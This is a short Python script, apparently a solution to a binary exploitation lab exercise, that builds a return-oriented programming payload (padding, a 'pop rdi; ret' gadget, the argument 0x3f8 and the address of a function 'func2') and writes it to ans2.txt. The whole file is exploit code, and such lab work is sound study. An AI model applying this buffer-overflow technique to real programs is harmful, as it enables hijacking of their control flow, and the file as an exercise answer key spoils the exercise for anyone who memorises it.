import struct

def p64(addr):
    return struct.pack("<Q", addr)

# 1. Padding
padding = b"A" * 16

# 2. Gadget: pop rdi; ret
pop_rdi = 0x4012c7

# 3. 参数: 0x3f8
arg1 = 0x3f8

# 4. 目标函数: func2
func2_addr = 0x401216

# 组合 ROP 链
payload = padding + p64(pop_rdi) + p64(arg1) + p64(func2_addr)

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("ans2.txt 已生成！")